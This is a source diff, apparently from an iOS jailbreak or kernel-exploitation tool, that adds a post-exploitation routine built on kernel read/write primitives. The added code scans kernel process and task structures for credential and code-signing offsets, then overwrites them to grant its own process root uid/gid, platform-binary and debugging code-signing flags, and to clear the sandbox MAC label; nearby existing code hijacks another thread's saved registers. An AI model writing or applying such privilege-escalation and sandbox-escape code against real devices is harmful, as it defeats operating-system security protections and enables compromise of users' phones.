@@ -31,6 +31,31 @@ uint64_t PROC_STRUCT_SIZE;
 uint32_t TASK_TNEXT_OFFSET;
 uint32_t THREAD_MUPCB_OFFSET;
 
+#ifndef CS_VALID
+#define CS_VALID 0x00000001
+#endif
+#ifndef CS_ADHOC
+#define CS_ADHOC 0x00000002
+#endif
+#ifndef CS_GET_TASK_ALLOW
+#define CS_GET_TASK_ALLOW 0x00000004
+#endif
+#ifndef CS_INSTALLER
+#define CS_INSTALLER 0x00000008
+#endif
+#ifndef CS_HARD
+#define CS_HARD 0x00000100
+#endif
+#ifndef CS_KILL
+#define CS_KILL 0x00000200
+#endif
+#ifndef CS_DEBUGGED
+#define CS_DEBUGGED 0x10000000
+#endif
+#ifndef CS_PLATFORM_BINARY
+#define CS_PLATFORM_BINARY 0x00400000
+#endif
+
 struct arm_saved_state64 {
   uint64_t x[29];
   uint64_t fp;
@@ -120,6 +145,221 @@ static NSString *const kkernprocoffset = @"lara.kernprocoff";
 
 static bool is_kptr(uint64_t p) {
     return (p & 0xffff000000000000ULL) == 0xffff000000000000ULL;
+}
+
+static uint64_t procsize_or_default(void) {
+    uint64_t procsize = getprocsize();
+    if (!procsize) {
+        procsize = PROC_STRUCT_SIZE;
+    }
+    if (!procsize) {
+        procsize = 0x740;
+    }
+    return procsize;
+}
+
+static uint32_t find_csflags_offset(uint64_t proc) {
+    uint64_t procsize = procsize_or_default();
+    uint64_t launchd = procbypid(1);
+
+    for (uint32_t off = 0x100; off + 4 < procsize; off += 4) {
+        uint32_t value = ds_kread32(proc + off);
+        if (!(value & CS_VALID)) continue;
+        if (value & 0xf0000000U) continue;
+
+        if (launchd) {
+            uint32_t launchdValue = ds_kread32(launchd + off);
+            if (launchdValue & CS_PLATFORM_BINARY) {
+                return off;
+            }
+        } else {
+            return off;
+        }
+    }
+
+    return 0;
+}
+
+static uint32_t find_ucred_offset(uint64_t proc) {
+    uint64_t procsize = procsize_or_default();
+    uid_t ourUid = getuid();
+
+    for (uint32_t off = 0x80; off + 8 < procsize; off += 8) {
+        uint64_t value = ds_kread64(proc + off);
+        if (!is_kptr(value)) continue;
+
+        uint32_t uid = ds_kread32(value + 0x18);
+        if (uid == ourUid) {
+            return off;
+        }
+    }
+
+    return 0;
+}
+
+static uint32_t find_task_offset(uint64_t proc) {
+    uint64_t procsize = procsize_or_default();
+    uint64_t candidate = ds_kread64(proc + procsize);
+    if (is_kptr(candidate)) {
+        return (uint32_t)procsize;
+    }
+
+    uint32_t start = procsize > 0x10 ? (uint32_t)(procsize - 0x10) : 0x100;
+    uint32_t end = (uint32_t)(procsize + 0x10);
+
+    for (uint32_t off = start; off < end; off += 8) {
+        uint64_t value = ds_kread64(proc + off);
+        if (is_kptr(value)) {
+            return off;
+        }
+    }
+
+    return (uint32_t)procsize;
+}
+
+static uint32_t find_task_flags_offset(uint64_t task) {
+    uint64_t launchd = procbypid(1);
+    uint64_t launchdTask = 0;
+
+    if (launchd) {
+        uint32_t taskOff = find_task_offset(launchd);
+        if (taskOff) {
+            uint64_t candidate = ds_kread64(launchd + taskOff);
+            if (is_kptr(candidate)) {
+                launchdTask = candidate;
+            }
+        }
+    }
+
+    for (uint32_t off = 0x100; off < 0x500; off += 4) {
+        uint32_t flags = ds_kread32(task + off);
+        uint32_t taskFlags = ds_kread32(task + off + 4);
+
+        if ((flags & 0xffff0000U) != 0) continue;
+        if ((flags & 0x0001U) == 0) continue;
+        if ((taskFlags & CS_VALID) == 0) continue;
+        if (taskFlags & 0xf0000000U) continue;
+
+        if (launchdTask) {
+            uint32_t launchdFlags = ds_kread32(launchdTask + off);
+            if (launchdFlags & 0x00000400U) {
+                return off;
+            }
+        } else {
+            return off;
+        }
+    }
+
+    return 0;
+}
+
+static int prepareIOKitAccess(void) {
+    if (!ds_is_ready()) {
+        printf("darksword not ready\n");
+        return -1;
+    }
+
+    uint64_t self = ourproc();
+    if (!self) {
+        printf("prepareIOKitAccess: could not resolve our proc\n");
+        return -1;
+    }
+
+    uint32_t csflagsOff = (uint32_t)getcsflagsoffset();
+    if (!csflagsOff) {
+        csflagsOff = find_csflags_offset(self);
+    }
+    if (!csflagsOff) {
+        printf("prepareIOKitAccess: could not resolve csflags offset\n");
+        return -1;
+    }
+
+    uint32_t ucredOff = (uint32_t)getucredooffset();
+    if (!ucredOff) {
+        ucredOff = find_ucred_offset(self);
+    }
+    if (!ucredOff) {
+        printf("prepareIOKitAccess: could not resolve ucred offset\n");
+        return -1;
+    }
+
+    uint64_t ucred = ds_kread64(self + ucredOff);
+    if (!is_kptr(ucred)) {
+        printf("prepareIOKitAccess: invalid ucred pointer\n");
+        return -1;
+    }
+
+    uint32_t taskOff = find_task_offset(self);
+    uint64_t task = ds_kread64(self + taskOff);
+    if (!is_kptr(task)) {
+        printf("prepareIOKitAccess: invalid task pointer\n");
+        return -1;
+    }
+
+    uint32_t oldCsflags = ds_kread32(self + csflagsOff);
+    uint32_t newCsflags = oldCsflags |
+        CS_PLATFORM_BINARY |
+        CS_DEBUGGED |
+        CS_GET_TASK_ALLOW |
+        CS_INSTALLER;
+    ds_kwrite32(self + csflagsOff, newCsflags);
+    if (ds_kread32(self + csflagsOff) != newCsflags) {
+        printf("prepareIOKitAccess: csflags verify failed\n");
+        return -1;
+    }
+
+    struct {
+        uint32_t offset;
+        uint32_t value;
+        const char *name;
+    } ucredWrites[] = {
+        { 0x18, 0, "cr_uid" },
+        { 0x1c, 0, "cr_gid" },
+        { 0x20, 0, "cr_ruid" },
+        { 0x24, 0, "cr_rgid" },
+    };
+
+    for (size_t i = 0; i < sizeof(ucredWrites) / sizeof(ucredWrites[0]); i++) {
+        ds_kwrite32(ucred + ucredWrites[i].offset, ucredWrites[i].value);
+        if (ds_kread32(ucred + ucredWrites[i].offset) != ucredWrites[i].value) {
+            printf("prepareIOKitAccess: %s verify failed\n", ucredWrites[i].name);
+            return -1;
+        }
+    }
+
+    uint64_t crLabel = ds_kread64(ucred + 0x78);
+    if (crLabel) {
+        ds_kwrite64(ucred + 0x78, 0);
+        if (ds_kread64(ucred + 0x78) != 0) {
+            printf("prepareIOKitAccess: cr_label verify failed\n");
+            return -1;
+        }
+    }
+
+    uint32_t tfOff = find_task_flags_offset(task);
+    if (tfOff) {
+        uint32_t tf = ds_kread32(task + tfOff);
+        uint32_t newTf = tf | 0x400;
+        ds_kwrite32(task + tfOff, newTf);
+        if (ds_kread32(task + tfOff) != newTf) {
+            printf("prepareIOKitAccess: task flags verify failed\n");
+            return -1;
+        }
+
+        uint32_t taskCsOff = tfOff + 4;
+        uint32_t taskCs = ds_kread32(task + taskCsOff);
+        uint32_t newTaskCs = taskCs |
+            CS_PLATFORM_BINARY |
+            CS_DEBUGGED |
+            CS_GET_TASK_ALLOW;
+        ds_kwrite32(task + taskCsOff, newTaskCs);
+        if (ds_kread32(task + taskCsOff) != newTaskCs) {
+            printf("prepareIOKitAccess: task csflags verify failed\n");
+            return -1;
+        }
+    }
+
+    return 0;
 }
 
 bool is_pac_supported(void) {
@@ -334,4 +574,8 @@ int killproc(const char* name) {
     ds_kwrite64(state + offsetof(struct arm_saved_state64, sp), 0x1337133713371337);
     
     return 0;
+}
+
+int patchcsflags(void) {
+    return prepareIOKitAccess();
 }
